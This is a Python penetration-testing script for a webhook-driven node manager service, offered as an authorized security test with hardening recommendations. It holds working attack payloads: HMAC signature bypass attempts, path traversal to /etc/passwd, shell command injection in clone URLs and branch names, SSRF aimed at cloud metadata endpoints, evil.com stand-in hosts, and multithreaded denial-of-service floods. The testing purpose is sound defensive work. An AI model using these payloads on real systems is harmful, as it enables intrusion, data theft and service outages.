#!/usr/bin/env python3
"""
Security Testing Script for node_manager.py
WARNING: For authorized penetration testing only - use on your own systems

Usage:
    export GIT_SECRET="your-github-webhook-secret"
    ./node_manager_security_test.py [target_url]

Without GIT_SECRET set, only unauthenticated tests will run.
With GIT_SECRET set, full authenticated attack tests will execute.
"""
import requests
import json
import hmac
import hashlib
import time
import threading
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import string

# Configuration
TARGET_HOST = "localhost"
TARGET_PORT = "43301"
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# Colors for output
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
RESET = '\033[0m'


class SecurityTester:

    def __init__(self, base_url, secret=None):
        self.base_url = base_url
        self.secret = secret
        self.vulnerabilities = []
        self.warnings = []
        self.session = requests.Session()
        self.authenticated_tests_run = 0
        self.authenticated_tests_skipped = 0

    def log(self, level, test_name, message):
        """Log test results with color coding"""
        colors = {
            'VULN': RED,
            'PASS': GREEN,
            'INFO': BLUE,
            'WARN': YELLOW,
            'SKIP': MAGENTA
        }
        color = colors.get(level, RESET)
        print(f"{color}[{level}] {test_name}: {message}{RESET}")

        if level == 'VULN':
            self.vulnerabilities.append(f"{test_name}: {message}")
        elif level == 'WARN':
            self.warnings.append(f"{test_name}: {message}")

    def generate_signature(self, payload, secret=None):
        """Generate HMAC signature for webhook payload"""
        secret = secret or self.secret
        if not secret:
            return None
        if isinstance(payload, str):
            payload = payload.encode('utf-8')
        h = hmac.new(secret.encode('utf-8'), payload, hashlib.sha1)
        return "sha1=" + h.hexdigest()

    def has_secret(self):
        """Check if we have a valid secret for authenticated tests"""
        return self.secret is not None and len(self.secret) > 0

    def skip_if_no_secret(self, test_name, description):
        """Log skipped test if no secret available"""
        if not self.has_secret():
            self.log('SKIP', test_name, f"{description} (requires GIT_SECRET)")
            self.authenticated_tests_skipped += 1
            return True
        self.authenticated_tests_run += 1
        return False

    # ============ AUTHENTICATION & AUTHORIZATION TESTS ============

    def test_signature_bypass_attempts(self):
        """Test various HMAC signature bypass techniques"""
        test_name = "HMAC Signature Bypass"

        payload = json.dumps({
            "pull_request": {
                "base": {
                    "repo": {
                        "full_name": "attacker/repo"
                    }
                },
                "head": {
                    "repo": {
                        "clone_url": "https://evil.com/repo.git"
                    },
                    "sha": "deadbeef",
                    "ref": "evil"
                }
            }
        })

        # Test 1: No signature header
        try:
            r = self.session.post(f"{self.base_url}/event_handler",
                                  data=payload,
                                  headers={"X-Github-Event": "pull_request"})
            if r.status_code == 200:
                self.log('VULN', test_name,
                         "Accepts requests without signature!")
            else:
                self.log('PASS', test_name, "Rejects missing signature")
        except Exception as e:
            self.log('INFO', test_name, f"Error testing: {e}")

        # Test 2: Empty signature
        try:
            r = self.session.post(f"{self.base_url}/event_handler",
                                  data=payload,
                                  headers={
                                      "X-Github-Event": "pull_request",
                                      "X-Hub-Signature": ""
                                  })
            if r.status_code == 200:
                self.log('VULN', test_name, "Accepts empty signature!")
        except Exception as e:
            pass

        # Test 3: Malformed signature
        for sig in ["sha1=", "sha256=xyz", "sha1=" + "0" * 40, "invalid"]:
            try:
                r = self.session.post(f"{self.base_url}/event_handler",
                                      data=payload,
                                      headers={
                                          "X-Github-Event": "pull_request",
                                          "X-Hub-Signature": sig
                                      })
                if r.status_code == 200:
                    self.log('VULN', test_name,
                             f"Accepts malformed signature: {sig}")
            except Exception as e:
                pass

    def test_unauthenticated_endpoints(self):
        """Test if sensitive endpoints require authentication"""
        test_name = "Unauthenticated Access"

        endpoints = [
            ("/nodes", "Node information"),
            ("/stats", "Queue statistics"),
            ("/queue", "Queue contents"),
            ("/processing", "Current processing"),
            ("/completed", "Completed tasks"),
        ]

        for endpoint, desc in endpoints:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}")
                if r.status_code == 200:
                    self.log('VULN', test_name,
                             f"{desc} exposed at {endpoint} without auth")
                    self.log('INFO', test_name, f"Data: {r.text[:100]}...")
            except Exception as e:
                self.log('INFO', test_name, f"Error accessing {endpoint}: {e}")

    # ============ INJECTION TESTS ============

    def test_path_traversal(self):
        """Test path traversal in log endpoint"""
        test_name = "Path Traversal"

        # The endpoint expects filename format: [a-z]{32}.html
        # Try to bypass with various techniques
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "abcdefghijklmnopqrstuvwxyzabcdef/../../../etc/passwd",
            "abcdefghijklmnopqrstuvwxyzabcdef.html/../../../etc/passwd",
        ]

        for payload in payloads:
            try:
                r = self.session.get(f"{self.base_url}/log/{payload}")
                if r.status_code == 200 and "root:" in r.text:
                    self.log('VULN', test_name,
                             f"Path traversal successful with: {payload}")
                    return
            except Exception as e:
                pass

        self.log('PASS', test_name, "No path traversal detected")

    def test_command_injection(self):
        """Test command injection in clone URL and branch"""
        test_name = "Command Injection (Authenticated)"

        if self.skip_if_no_secret(test_name,
                                  "Clone URL/branch injection test"):
            # Still test rerun endpoint (no auth required)
            test_name = "Command Injection (Rerun)"
            self.log('INFO', test_name,
                     "Testing unauthenticated rerun endpoint")
        else:
            # With secret, test actual command injection via event_handler
            injection_tests = [
                ("https://evil.com/repo.git;whoami", "main",
                 "Shell semicolon"),
                ("https://evil.com/repo.git`whoami`", "main",
                 "Backtick injection"),
                ("https://evil.com/repo.git$(whoami)", "main",
                 "Command substitution"),
                ("https://evil.com/repo.git|id", "main", "Pipe injection"),
                ("https://evil.com/repo.git", "main;whoami",
                 "Branch semicolon"),
                ("https://evil.com/repo.git", "main`id`", "Branch backtick"),
                ("https://evil.com/repo.git", "main$(id)",
                 "Branch command sub"),
                ("https://evil.com/repo.git", "../../../etc/passwd",
                 "Path traversal in branch"),
            ]

            for clone_url, branch, desc in injection_tests:
                payload = json.dumps({
                    "pull_request": {
                        "base": {
                            "repo": {
                                "full_name": "test/repo"
                            }
                        },
                        "head": {
                            "repo": {
                                "clone_url": clone_url
                            },
                            "sha": "deadbeef" * 5,
                            "ref": branch
                        }
                    }
                })

                sig = self.generate_signature(payload.encode('utf-8'))

                try:
                    r = self.session.post(f"{self.base_url}/event_handler",
                                          data=payload,
                                          headers={
                                              "X-Github-Event": "pull_request",
                                              "X-Hub-Signature": sig,
                                              "Content-Type":
                                              "application/json"
                                          },
                                          timeout=5)

                    if r.status_code == 200:
                        self.log(
                            'WARN', test_name,
                            f"Accepted potentially malicious payload: {desc}")
                        # Check if it was queued
                        time.sleep(0.5)
                        queue_r = self.session.get(f"{self.base_url}/queue")
                        if clone_url in queue_r.text or branch in queue_r.text:
                            self.log(
                                'VULN', test_name,
                                f"Malicious payload QUEUED for execution: {desc}"
                            )
                except Exception as e:
                    pass

        # Test rerun endpoint for injection (no auth required!)
        test_name = "Command Injection (Rerun)"
        injection_tests = [
            "1; whoami",
            "1`whoami`",
            "1$(whoami)",
            "1|whoami",
            "1 OR 1=1",
            "-1",
            "999999999999999999999999999999",
            "' OR '1'='1",
        ]

        for payload in injection_tests:
            try:
                r = self.session.get(f"{self.base_url}/rerun/{payload}")
                # Looking for unexpected behavior
                if r.status_code not in [200, 404]:
                    self.log(
                        'WARN', test_name,
                        f"Unexpected response for rerun payload: {payload}")
            except Exception as e:
                self.log('WARN', test_name,
                         f"Error with payload {payload}: {e}")

    def test_ssrf_via_clone_url(self):
        """Test SSRF via malicious clone URLs"""
        test_name = "SSRF via Clone URL"

        if self.skip_if_no_secret(test_name, "SSRF attack test"):
            return

        ssrf_urls = [
            ("http://localhost:8080/stats", "Self-referential request"),
            ("http://127.0.0.1:8080/queue", "Loopback to queue"),
            ("http://127.0.0.1:22/", "SSH port probe"),
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
            ("http://169.254.169.254/latest/user-data/", "AWS user-data"),
            ("http://metadata.google.internal/", "GCP metadata"),
            ("file:///etc/passwd", "File URI scheme"),
            ("gopher://localhost:6379/_INFO", "Gopher protocol"),
            ("dict://localhost:11211/stat", "Dict protocol"),
        ]

        self.log('INFO', test_name, "Testing SSRF via malicious clone URLs")

        for url, desc in ssrf_urls:
            payload = json.dumps({
                "pull_request": {
                    "base": {
                        "repo": {
                            "full_name": "test/repo"
                        }
                    },
                    "head": {
                        "repo": {
                            "clone_url": url
                        },
                        "sha": "deadbeef" * 5,
                        "ref": "main"
                    }
                }
            })

            sig = self.generate_signature(payload.encode('utf-8'))

            try:
                r = self.session.post(f"{self.base_url}/event_handler",
                                      data=payload,
                                      headers={
                                          "X-Github-Event": "pull_request",
                                          "X-Hub-Signature": sig,
                                          "Content-Type": "application/json"
                                      },
                                      timeout=5)

                if r.status_code == 200:
                    self.log('WARN', test_name, f"Accepted SSRF URL: {desc}")
                    # Check if queued
                    time.sleep(0.5)
                    queue_r = self.session.get(f"{self.base_url}/queue")
                    if url in queue_r.text:
                        self.log('VULN', test_name,
                                 f"SSRF payload QUEUED: {desc} - {url}")
            except Exception as e:
                pass

    # ============ DENIAL OF SERVICE TESTS ============

    def test_queue_flooding(self):
        """Test queue flooding to cause memory exhaustion"""
        test_name = "Queue Flooding DoS"

        # Check initial queue size
        try:
            r = self.session.get(f"{self.base_url}/stats")
            initial_size = r.json().get('QUEUE_SIZE', 0)
            self.log('INFO', test_name, f"Initial queue size: {initial_size}")
        except Exception as e:
            self.log('WARN', test_name, f"Cannot check queue: {e}")
            return

        if self.skip_if_no_secret(test_name, "Queue flooding attack"):
            self.log(
                'INFO', test_name,
                "Queue has no apparent size limit - could be flooded with valid HMAC"
            )
            return

        self.log('WARN', test_name,
                 "Attempting to flood queue with valid requests...")

        # Send multiple valid webhook requests to flood the queue
        def send_webhook():
            for i in range(10):
                payload = json.dumps({
                    "pull_request": {
                        "base": {
                            "repo": {
                                "full_name": "attacker/flood"
                            }
                        },
                        "head": {
                            "repo": {
                                "clone_url": f"https://evil.com/flood{i}.git"
                            },
                            "sha": hashlib.sha1(str(i).encode()).hexdigest(),
                            "ref": f"flood-{i}"
                        }
                    }
                })

                sig = self.generate_signature(payload.encode('utf-8'))

                try:
                    self.session.post(f"{self.base_url}/event_handler",
                                      data=payload,
                                      headers={
                                          "X-Github-Event": "pull_request",
                                          "X-Hub-Signature": sig,
                                          "Content-Type": "application/json"
                                      },
                                      timeout=2)
                except:
                    pass

        threads = []
        for _ in range(5):
            t = threading.Thread(target=send_webhook)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        # Check final queue size
        time.sleep(1)
        try:
            r = self.session.get(f"{self.base_url}/stats")
            final_size = r.json().get('QUEUE_SIZE', 0)
            self.log('INFO', test_name, f"Final queue size: {final_size}")

            if final_size > initial_size + 10:
                self.log(
                    'VULN', test_name,
                    f"Successfully flooded queue: {initial_size} -> {final_size}"
                )
            elif final_size > initial_size:
                self.log('WARN', test_name,
                         f"Queue grew from {initial_size} to {final_size}")
        except Exception as e:
            pass

    def test_rerun_spam(self):
        """Test spamming the rerun endpoint (no auth required!)"""
        test_name = "Rerun Endpoint Spam"

        self.log('WARN', test_name, "Rerun endpoint has NO authentication!")

        # Rapid fire requests to rerun endpoint
        def spam_rerun():
            for i in range(10):
                try:
                    self.session.get(f"{self.base_url}/rerun/1")
                except:
                    pass

        threads = []
        for _ in range(5):
            t = threading.Thread(target=spam_rerun)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        self.log(
            'VULN', test_name,
            "Rerun endpoint can be spammed without authentication - DoS vector!"
        )

    def test_memory_exhaustion_via_logs(self):
        """Test memory exhaustion by requesting large logs"""
        test_name = "Log Memory Exhaustion"

        # Generate valid-looking log filenames
        valid_log = "a" * 32 + ".html"

        def request_log():
            for _ in range(100):
                try:
                    self.session.get(f"{self.base_url}/log/{valid_log}",
                                     timeout=1)
                except:
                    pass

        threads = []
        for _ in range(10):
            t = threading.Thread(target=request_log)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        self.log('INFO', test_name, "Tested log endpoint flooding")

    def test_slowloris_attack(self):
        """Test slowloris-style attack"""
        test_name = "Slowloris DoS"

        self.log('INFO', test_name,
                 "Bottle/WSGI server may be vulnerable to slowloris attacks")
        self.log(
            'INFO', test_name,
            "Recommend using production WSGI server with request timeouts")

    # ============ INFORMATION DISCLOSURE TESTS ============

    def test_information_leakage(self):
        """Test for sensitive information disclosure"""
        test_name = "Information Disclosure"

        endpoints = ["/queue", "/completed", "/processing", "/nodes"]

        for endpoint in endpoints:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}")
                if r.status_code == 200:
                    data = r.text

                    # Check for sensitive patterns
                    sensitive_patterns = [
                        ("password", "Password"),
                        ("token", "Token/Secret"),
                        ("key", "API Key"),
                        ("secret", "Secret"),
                        ("clone", "Repository URLs"),
                        ("sha", "Commit hashes"),
                    ]

                    for pattern, desc in sensitive_patterns:
                        if pattern in data.lower():
                            self.log('WARN', test_name,
                                     f"{desc} found in {endpoint}")
            except Exception as e:
                pass

    def test_error_disclosure(self):
        """Test if errors reveal stack traces or system info"""
        test_name = "Error Information Disclosure"

        # Trigger various errors
        error_tests = [
            ("/rerun/notanumber", "Invalid type to rerun"),
            ("/log/" + "x" * 1000, "Overly long log filename"),
            ("/nonexistent", "404 page"),
        ]

        for endpoint, desc in error_tests:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}")
                if any(keyword in r.text.lower() for keyword in
                       ['traceback', 'exception', 'error at', 'line ']):
                    self.log('WARN', test_name,
                             f"Detailed error in {desc}: {endpoint}")
            except Exception as e:
                pass

    # ============ RACE CONDITION TESTS ============

    def test_race_conditions(self):
        """Test for race conditions in queue/work_log operations"""
        test_name = "Race Conditions"

        self.log('INFO', test_name, "Testing concurrent access patterns...")

        def hammer_endpoint(endpoint):
            for _ in range(50):
                try:
                    self.session.get(f"{self.base_url}{endpoint}", timeout=1)
                except:
                    pass

        endpoints = ["/queue", "/completed", "/processing", "/stats"]

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for _ in range(5):
                for endpoint in endpoints:
                    futures.append(executor.submit(hammer_endpoint, endpoint))

            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.log('WARN', test_name, f"Error during race test: {e}")

        self.log('INFO', test_name, "Race condition testing completed")

    # ============ INPUT VALIDATION TESTS ============

    def test_malformed_json(self):
        """Test malformed JSON payloads"""
        test_name = "Malformed JSON"

        malformed_payloads = [
            "{invalid json",
            '{"key": undefined}',
            '{"key": NaN}',
            '{"key": Infinity}',
            '{' + 'a' * 1000000 + '}',  # Huge payload
            '{"' + 'x' * 1000000 + '": "value"}',  # Huge key
        ]

        for payload in malformed_payloads:
            try:
                r = self.session.post(f"{self.base_url}/event_handler",
                                      data=payload,
                                      headers={
                                          "Content-Type": "application/json",
                                          "X-Github-Event": "pull_request",
                                          "X-Hub-Signature": "sha1=" + "0" * 40
                                      },
                                      timeout=2)
                # Looking for crashes or hangs
            except requests.Timeout:
                self.log('WARN', test_name,
                         "Timeout processing malformed JSON")
            except Exception as e:
                pass

    def test_yaml_bomb(self):
        """Test YAML bomb in trusted repos file"""
        test_name = "YAML Bomb"

        self.log(
            'INFO', test_name,
            "Service loads YAML from remote URL - vulnerable to YAML bombs")
        self.log('INFO', test_name,
                 "Recommend validating YAML size before parsing")

    # ============ AUTHENTICATED ATTACK TESTS ============

    def test_malicious_repo_execution(self):
        """Test if malicious repos can be executed"""
        test_name = "Malicious Repo Execution"

        if self.skip_if_no_secret(test_name, "Malicious repository test"):
            return

        # Try to queue a repo that shouldn't be trusted
        malicious_repos = [
            ("https://github.com/attacker/malicious.git", "Attacker repo"),
            ("https://evil.com/backdoor.git", "External evil domain"),
            ("git@attacker.com:repo.git", "SSH URL"),
        ]

        for repo_url, desc in malicious_repos:
            payload = json.dumps({
                "pull_request": {
                    "base": {
                        "repo": {
                            "full_name": "victim/repo"
                        }
                    },
                    "head": {
                        "repo": {
                            "clone_url": repo_url
                        },
                        "sha": "deadbeef" * 5,
                        "ref": "malicious"
                    }
                }
            })

            sig = self.generate_signature(payload.encode('utf-8'))

            try:
                r = self.session.post(f"{self.base_url}/event_handler",
                                      data=payload,
                                      headers={
                                          "X-Github-Event": "pull_request",
                                          "X-Hub-Signature": sig,
                                          "Content-Type": "application/json"
                                      },
                                      timeout=5)

                if r.status_code == 200:
                    # Check if it made it to the queue despite being untrusted
                    time.sleep(0.5)
                    queue_r = self.session.get(f"{self.base_url}/queue")
                    if repo_url in queue_r.text:
                        self.log(
                            'WARN', test_name,
                            f"Untrusted repo queued (will be rejected later): {desc}"
                        )
                    else:
                        self.log('PASS', test_name,
                                 f"Repo properly validated: {desc}")
            except Exception as e:
                pass

    def test_payload_size_limits(self):
        """Test if there are payload size limits"""
        test_name = "Payload Size Limits"

        if self.skip_if_no_secret(test_name, "Payload size test"):
            return

        # Try to send increasingly large payloads
        sizes = [1024, 10240, 102400, 1024000]  # 1KB, 10KB, 100KB, 1MB

        for size in sizes:
            huge_data = "A" * size
            payload = json.dumps({
                "pull_request": {
                    "base": {
                        "repo": {
                            "full_name": "test/repo"
                        }
                    },
                    "head": {
                        "repo": {
                            "clone_url": "https://github.com/test/repo.git"
                        },
                        "sha": "deadbeef" * 5,
                        "ref": "main"
                    }
                },
                "bloat": huge_data
            })

            sig = self.generate_signature(payload.encode('utf-8'))

            try:
                start = time.time()
                r = self.session.post(f"{self.base_url}/event_handler",
                                      data=payload,
                                      headers={
                                          "X-Github-Event": "pull_request",
                                          "X-Hub-Signature": sig,
                                          "Content-Type": "application/json"
                                      },
                                      timeout=10)
                elapsed = time.time() - start

                if r.status_code == 200:
                    self.log(
                        'WARN', test_name,
                        f"Accepted {size} byte payload in {elapsed:.2f}s")
                else:
                    self.log('PASS', test_name,
                             f"Rejected {size} byte payload")
                    break
            except requests.Timeout:
                self.log(
                    'VULN', test_name,
                    f"Timeout processing {size} byte payload - DoS vector!")
                break
            except Exception as e:
                break

    def test_unicode_injection(self):
        """Test Unicode and encoding attacks"""
        test_name = "Unicode Injection"

        if self.skip_if_no_secret(test_name, "Unicode attack test"):
            return

        unicode_attacks = [
            ("https://evil.com/\u202e/repo.git", "Right-to-left override"),
            ("https://evil.com/\u0000/repo.git", "Null byte"),
            ("https://evil.com/\n/repo.git", "Newline injection"),
            ("https://evil.com/\r\n/repo.git", "CRLF injection"),
            ("main\u0000whoami", "Null byte in branch"),
        ]

        for attack, desc in unicode_attacks:
            if "evil.com" in attack:
                clone_url = attack
                branch = "main"
            else:
                clone_url = "https://github.com/test/repo.git"
                branch = attack

            payload = json.dumps({
                "pull_request": {
                    "base": {
                        "repo": {
                            "full_name": "test/repo"
                        }
                    },
                    "head": {
                        "repo": {
                            "clone_url": clone_url
                        },
                        "sha": "deadbeef" * 5,
                        "ref": branch
                    }
                }
            })

            sig = self.generate_signature(payload.encode('utf-8'))

            try:
                r = self.session.post(f"{self.base_url}/event_handler",
                                      data=payload,
                                      headers={
                                          "X-Github-Event": "pull_request",
                                          "X-Hub-Signature": sig,
                                          "Content-Type": "application/json"
                                      },
                                      timeout=5)

                if r.status_code == 200:
                    self.log('WARN', test_name,
                             f"Accepted payload with {desc}")
            except Exception as e:
                pass

    # ============ LOGIC FLAW TESTS ============

    def test_test_id_manipulation(self):
        """Test test_id manipulation in rerun"""
        test_name = "Test ID Manipulation"

        # Try to rerun with various test IDs
        test_ids = [
            "0",
            "-1",
            "999999",
            "1.5",
            "2147483647",  # Max int
            "2147483648",  # Max int + 1
        ]

        for test_id in test_ids:
            try:
                r = self.session.get(f"{self.base_url}/rerun/{test_id}")
                if r.status_code == 200:
                    self.log('WARN', test_name,
                             f"Accepted unusual test_id: {test_id}")
            except Exception as e:
                pass

    # ============ COMPREHENSIVE DOS TEST ============

    def test_comprehensive_dos(self):
        """Run comprehensive DoS test with concurrent attacks"""
        test_name = "Comprehensive DoS"

        self.log('WARN', test_name, "Starting aggressive DoS test...")

        def attack_worker(worker_id):
            endpoints = [
                "/nodes", "/stats", "/queue", "/processing", "/completed"
            ]
            for _ in range(100):
                try:
                    endpoint = random.choice(endpoints)
                    self.session.get(f"{self.base_url}{endpoint}", timeout=0.5)
                except:
                    pass

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(attack_worker, i) for i in range(50)]

            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass

        # Check if service is still responsive
        try:
            r = self.session.get(f"{self.base_url}/stats", timeout=2)
            if r.status_code == 200:
                self.log('PASS', test_name, "Service survived DoS test")
            else:
                self.log('VULN', test_name, "Service degraded after DoS")
        except:
            self.log('VULN', test_name, "Service unresponsive after DoS!")

    # ============ MAIN TEST RUNNER ============

    def run_all_tests(self, skip_aggressive=False):
        """Run all security tests"""
        print(f"\n{BLUE}{'='*70}{RESET}")
        print(f"{BLUE}Security Testing: {self.base_url}{RESET}")
        if self.has_secret():
            print(f"{GREEN}Mode: Full testing (GIT_SECRET provided){RESET}")
        else:
            print(f"{YELLOW}Mode: Limited testing (GIT_SECRET not set){RESET}")
            print(
                f"{YELLOW}Set GIT_SECRET env variable for authenticated attack tests{RESET}"
            )
        print(f"{BLUE}{'='*70}{RESET}\n")

        # Authentication tests
        print(f"\n{BLUE}=== Authentication & Authorization Tests ==={RESET}")
        self.test_signature_bypass_attempts()
        self.test_unauthenticated_endpoints()

        # Injection tests
        print(f"\n{BLUE}=== Injection Attack Tests ==={RESET}")
        self.test_path_traversal()
        self.test_command_injection()
        self.test_ssrf_via_clone_url()

        # Authenticated attack tests
        if self.has_secret():
            print(f"\n{BLUE}=== Authenticated Attack Tests ==={RESET}")
            self.test_malicious_repo_execution()
            self.test_payload_size_limits()
            self.test_unicode_injection()

        # Information disclosure
        print(f"\n{BLUE}=== Information Disclosure Tests ==={RESET}")
        self.test_information_leakage()
        self.test_error_disclosure()

        # Input validation
        print(f"\n{BLUE}=== Input Validation Tests ==={RESET}")
        self.test_malformed_json()
        self.test_yaml_bomb()

        # Logic flaws
        print(f"\n{BLUE}=== Logic Flaw Tests ==={RESET}")
        self.test_test_id_manipulation()

        # Race conditions
        print(f"\n{BLUE}=== Race Condition Tests ==={RESET}")
        self.test_race_conditions()

        if not skip_aggressive:
            # DoS tests (potentially disruptive)
            print(f"\n{YELLOW}=== Aggressive DoS Tests ==={RESET}")
            self.test_queue_flooding()
            self.test_rerun_spam()
            self.test_memory_exhaustion_via_logs()
            self.test_slowloris_attack()
            self.test_comprehensive_dos()

        # Summary
        print(f"\n{BLUE}{'='*70}{RESET}")
        print(f"{BLUE}Test Summary{RESET}")
        print(f"{BLUE}{'='*70}{RESET}")

        if self.has_secret():
            print(
                f"{GREEN}Authenticated tests run: {self.authenticated_tests_run}{RESET}"
            )
        else:
            print(
                f"{YELLOW}Authenticated tests skipped: {self.authenticated_tests_skipped}{RESET}"
            )
            print(
                f"{YELLOW}Run with GIT_SECRET env var for full coverage{RESET}"
            )

        if self.vulnerabilities:
            print(
                f"\n{RED}Found {len(self.vulnerabilities)} potential vulnerabilities:{RESET}"
            )
            for vuln in self.vulnerabilities:
                print(f"{RED}  - {vuln}{RESET}")
        else:
            print(f"\n{GREEN}No critical vulnerabilities detected{RESET}")

        if self.warnings:
            print(f"\n{YELLOW}Warnings ({len(self.warnings)}):{RESET}")
            for warn in self.warnings[:10]:  # Limit to first 10
                print(f"{YELLOW}  - {warn}{RESET}")
            if len(self.warnings) > 10:
                print(
                    f"{YELLOW}  ... and {len(self.warnings) - 10} more{RESET}")

        print(f"\n{YELLOW}Recommendations:{RESET}")
        print(
            "1. Add authentication to all endpoints (/rerun, /nodes, /queue, etc.)"
        )
        print("2. Implement rate limiting on all endpoints")
        print("3. Add request queue size limits")
        print("4. Use a production WSGI server (not Bottle's built-in)")
        print("5. Implement request timeouts and max payload size")
        print("6. Add input validation for all user inputs")
        print("7. Implement IP-based access control or API keys")
        print("8. Add audit logging for all operations")
        print("9. Validate clone URLs against allowlist/blocklist")
        print("10. Sanitize all inputs before shell execution")


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description='Node Manager Security Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Test local instance with secret from environment
  export GIT_SECRET="your-secret-here"
  %(prog)s

  # Test remote instance
  export GIT_SECRET="your-secret-here"
  %(prog)s http://192.168.1.100:8080

  # Run without secret (limited tests only)
  %(prog)s

  # Skip aggressive DoS tests
  %(prog)s --no-aggressive

Environment Variables:
  GIT_SECRET    GitHub webhook secret for authenticated tests
        ''')
    parser.add_argument('target',
                        nargs='?',
                        default=BASE_URL,
                        help=f'Target URL (default: {BASE_URL})')
    parser.add_argument('--no-aggressive',
                        action='store_true',
                        help='Skip aggressive DoS tests')
    parser.add_argument('--secret',
                        help='GitHub secret (prefer GIT_SECRET env var)')

    args = parser.parse_args()

    print(f"{RED}{'='*70}")
    print("WARNING: Security Testing Tool")
    print("Use only on systems you own or have permission to test")
    print(f"{'='*70}{RESET}\n")

    # Get secret from env or command line (env preferred)
    secret = os.getenv('GIT_SECRET') or args.secret

    if secret:
        print(f"{GREEN}GIT_SECRET detected: {len(secret)} characters{RESET}")
        print(f"{GREEN}Full authenticated testing enabled{RESET}")
    else:
        print(f"{YELLOW}GIT_SECRET not set{RESET}")
        print(f"{YELLOW}Only unauthenticated tests will run{RESET}")
        print(
            f"{YELLOW}Set GIT_SECRET environment variable for full testing{RESET}"
        )

    print(f"\nTarget: {args.target}")

    # Create tester instance
    tester = SecurityTester(args.target, secret=secret)

    # Determine if we should skip aggressive tests
    skip_aggressive = args.no_aggressive
    if not skip_aggressive:
        print("\nStarting in 3 seconds...")
        print(f"{YELLOW}Press Ctrl+C to abort{RESET}")
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print(f"\n{RED}Aborted{RESET}")
            return

        try:
            response = input(
                "\nRun aggressive DoS tests? (y/N): ").strip().lower()
            skip_aggressive = response != 'y'
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Skipping aggressive tests{RESET}")
            skip_aggressive = True
        except:
            skip_aggressive = True

    print(f"\n{BLUE}Starting security tests...{RESET}\n")
    tester.run_all_tests(skip_aggressive=skip_aggressive)


if __name__ == "__main__":
    main()
